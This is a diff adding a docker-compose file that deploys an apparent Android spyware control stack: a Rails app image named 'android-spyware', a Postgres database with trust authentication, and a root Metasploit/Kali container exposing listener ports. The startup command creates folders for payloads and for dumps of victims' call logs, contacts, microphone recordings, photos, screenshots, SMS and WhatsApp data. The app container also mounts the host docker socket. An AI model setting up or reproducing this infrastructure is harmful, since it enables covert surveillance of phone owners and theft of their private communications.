@@ -1,0 +1,35 @@
+version: "3.7"
+services:
+  rails-app:
+    image: costincanciu/android-spyware:latest
+    depends_on:
+      - db
+      - metasploit
+    ports:
+      - "80:80"
+    volumes:
+      - ./files:/app/android-spyware/files
+      - //var/run/docker.sock://var/run/docker.sock
+    entrypoint: sh -c "mkdir -p /app/android-spyware/files/payloads /app/android-spyware/files/dumps/calllogs_dumps /app/android-spyware/files/dumps/contacts_dumps /app/android-spyware/files/dumps/microphone_recs /app/android-spyware/files/dumps/pictures /app/android-spyware/files/dumps/screen_snaps /app/android-spyware/files/dumps/sms_messages_dumps /app/android-spyware/files/dumps/whatsapp | rails s -b 0.0.0.0 -p 80"
+    tty: true
+    environment:
+      ADB_HOST: gateway.docker.internal
+      #MAPS_API_KEY: YOUR KEY HERE
+  db:
+    image: costincanciu/android-spyware-db:latest
+    ports:
+      - "5432:5432"
+    volumes:
+      - db:/var/lib/postgresql/data
+    environment:
+      POSTGRES_HOST_AUTH_METHOD: trust
+  metasploit:
+    container_name: kali_container
+    image: costincanciu/android-spyware-msf:latest
+    ports:
+    - "2222:2222"
+    - "3333:3333"
+    - "4444:4444"
+    user: root
+volumes:
+  db:
